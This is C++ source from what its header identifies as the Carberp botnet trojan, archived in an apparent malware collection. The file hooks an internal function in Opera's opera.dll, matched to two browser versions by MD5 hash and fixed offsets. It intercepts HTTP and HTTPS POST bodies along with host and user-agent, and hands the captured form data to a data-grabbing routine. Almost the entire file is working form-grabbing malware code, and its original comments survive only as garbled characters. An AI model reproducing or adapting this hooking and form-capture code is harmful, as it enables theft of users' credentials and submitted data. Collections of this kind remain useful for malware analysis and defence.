/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
#include <windows.h>
#include <windowsx.h>

#include "GetApi.h"
#include "Utils.h"

#include "Memory.h"
#include "Strings.h"

#include "BotConfig.h"
#include "BotUtils.h"
#include "Rootkit.h"
#include "Inject.h"
#include "Unhook.h"
#include "Splice.h"
#include "Loader.h"

#include "Opera.h"

// ����� �������������� ������ Opera
static const LONG OperaVerCount = 2;

// MD5-���� opera.dll ��� ������: 11.00, 11.01
static BYTE OperaMD5Hashes [OperaVerCount][16] = {
        0xba, 0xc2, 0x26, 0x29, 0x9e, 0x10, 0x0d, 0x8e,
			  0x47, 0x09, 0xd1, 0xfc, 0xad, 0xe8, 0x96, 0xb9,		// 11.00
				0x95, 0xce, 0x52, 0x17, 0xd7, 0x39, 0x99, 0x95,
				0x25, 0xd9, 0x60, 0x30, 0x92, 0x1d, 0xaa, 0xf7	  // 11.01
       };

// ������������� ������ ��������� ��� ���� � opera.dll
static DWORD OperaVAOffsets [OperaVerCount] = {
        0x007A0C,   // 11.00
				0x2BEFBF    // 11.01
       };

//  GetHookProcVA - �� ������ MD5-����� ���������� ������ opera.dll
//  � ���������� V-����� ������ ������� ��� 0, � ������ �������
static LONG GetHookProcVA();

// ��� ������� ������� �� ����� ������ ��� Opera
typedef int ( __stdcall *PGetPostProc   )( int i1, int iFlag, LPVOID lpMem, int nLen );
static PGetPostProc    Real_GetPostProc;


/************************************************************************/
/* ����������� ���������� ���������������� �-� �� opera.dll             */
// � �� �������� ��� �� ������������� ������ GET/POST ��������
//--------------------------------
// ���������:
// i1 - �� ��������, ������ ����� ������� ��������� Self �� ������ ������
// iFlag - �� ��������, �� � ���� opera.dll ����� ���� ��� �� ������� 
//         ����� ���������� � ���������� 0x17
// lpMem - ��-�� �� ����� � �������
// nLen - ����� ������
//--------------------------------
PCHAR szDbgBufTMP=NULL;
int __stdcall Hook_GetPostProc(int i1, int iFlag, LPVOID lpMem, int nLen)
{
	// ��������, ��� ������� �� ��� ���������, ��� ��� ����������
	if (0x17 == iFlag)
	{
		// �.�. � ������ ����� � �� ��������� ������������ ����, ��
		// �������� ������ � ����������� sz-����� � ������� ������
		// �� ���������� �������
		PCHAR szDbgBuf = STR::New((PCHAR)lpMem,(DWORD)nLen );
		m_memcpy(szDbgBuf, lpMem, nLen);
		if (szDbgBuf[0]!='G'&& szDbgBuf[0]!='P'&& szDbgBufTMP!=NULL)
		{
			PCHAR Temp = STR::New(szDbgBufTMP,(DWORD)nLen);
			PCHAR cHOST=GetTextBetween(Temp,"POST ","HTTP");
			
			bool IsHttps=false;
			if (Temp[4]=='S')
				IsHttps=true;
			
			//OutputDebugStr(Temp);
			PCHAR OUserAgent=GetTextBetween(Temp,"User-Agent: ","\r\n");
			STR::Free(Temp);
			Temp = STR::New(szDbgBufTMP,(DWORD)nLen);
			PCHAR cHOST2=GetTextBetween(Temp,"Host: ","\r\n");
			PCHAR Hosts;
			if(IsHttps) 
				Hosts	= STR::New(3,"https:\\\\",cHOST2,cHOST);
			else
				Hosts	= STR::New(3,"http:\\\\",cHOST2,cHOST);

			PCHAR Buf = STR::New(3, Hosts, "?|POST:", szDbgBuf);
			
			DataGrabber::AddData(Hosts, szDbgBuf, OUserAgent/*IEUserAgent*/, BROWSER_TYPE_O, DATA_TYPE_FORM );
			//SendFormGrabberLogs(Hosts, szDbgBuf, OUserAgent/*IEUserAgent*/, BROWSER_TYPE_O, DATA_TYPE_FORMGRAB );

			/*OutputDebugStr(cHOST2);
			OutputDebugStr(cHOST);
			OutputDebugStr(OUserAgent);*/
			STR::Free(Buf);
			STR::Free(cHOST2);
			STR::Free(cHOST);
			STR::Free(OUserAgent);
			STR::Free(Temp);
			STR::Free(Hosts);			
			STR::Free(szDbgBufTMP);
		}
		if (szDbgBuf[0]=='P')
		{
			szDbgBufTMP=szDbgBuf;
		}
	}

	// �������� ������������ �������
	return Real_GetPostProc(i1, iFlag, lpMem, nLen);
}

/************************************************************************/
bool WINAPI IsOpera()
{
	// ������� ������ ������ ���� ��� ������� � ��������
	// Java.exe ��� Javaw.exe
	WCHAR *ModulePath = (WCHAR*)MemAlloc( MAX_PATH );

	if ( ModulePath == NULL )
	{
		return false;
	}

	pGetModuleFileNameW( NULL, ModulePath, MAX_PATH );
	DWORD dwProcessHash = GetNameHash( ModulePath );

	// opera.exe
	if ( dwProcessHash == 0x7A38EBF3 )
		{
			MemFree( ModulePath );
			return true;
		}

	MemFree( ModulePath );
	return false;
}


/************************************************************************/
bool HookOpera()
{
	// ������� ������ ���� �� ������� ������� ������� ����������
	// Opera ��� ������ �� ������ ������
	// �������� ������ � ������ ������ �� �������� Java

	if ( !IsOpera() )
	{
		return false;
	}

	DWORD HookVA = GetHookProcVA();
	if (HookVA)
		UnhookOpera(HookVA);

	HookOperaApi();

	return true;
}

/************************************************************************/
bool HookOperaApi()
{
	DWORD HookVA = GetHookProcVA();
	if (HookVA)
	{
		if ( HookApi2( 14, HookVA, (DWORD)&Hook_GetPostProc ) )
		{  
			__asm mov [Real_GetPostProc], eax			
		}
	}
	
	
	return true;
}

/************************************************************************/
LONG GetHookProcVA()
{
	// ������ 0, ���� ����� ���������� �� �������
	LONG res = 0;

	// �������� ������ ���� � ����������� opera.dll � ������� � MD5-���
	HMODULE hLib = (HMODULE)GetProcAddressEx( NULL, 14, 0 );
	char *szLibPath = (char *)MemAllocAndClear(MAX_PATH);
	if (pGetModuleFileNameA(hLib, szLibPath, MAX_PATH))
	{		
		// ������� ��� �� �����
		char *Hash = CalcFileMD5Hash(szLibPath);
		if (Hash)
		{
			for (int i = 0; i < OperaVerCount; i++)
			{
				// � ���������� ��� � ���������� ����������
				if (0 == m_memcmp(Hash, OperaMD5Hashes[i], 16))
				{
					res = OperaVAOffsets[i];
					break;
				}
			}
			MemFree(Hash);
		}
	}
	MemFree(szLibPath);

	return res;
}